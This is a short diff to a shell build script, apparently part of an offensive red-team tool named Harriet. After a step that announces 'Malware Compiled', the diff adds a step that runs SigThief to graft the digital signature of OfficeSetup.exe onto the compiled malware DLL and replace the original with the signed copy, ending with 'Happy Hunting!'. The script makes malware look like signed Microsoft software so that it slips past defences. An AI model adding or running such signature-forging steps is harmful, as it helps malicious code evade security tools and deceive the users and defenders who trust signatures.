@@ -144,3 +144,11 @@ echo ""
 sleep 2
 rm shell*
 echo -e ${yellow}"***Malware Compiled***"${clear}
+echo ""
+echo -e ${yellow}"***Signing DLL***"${clear}
+python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
+mv signed$MALWARE $MALWARE
+echo ""
+echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
+echo ""
+
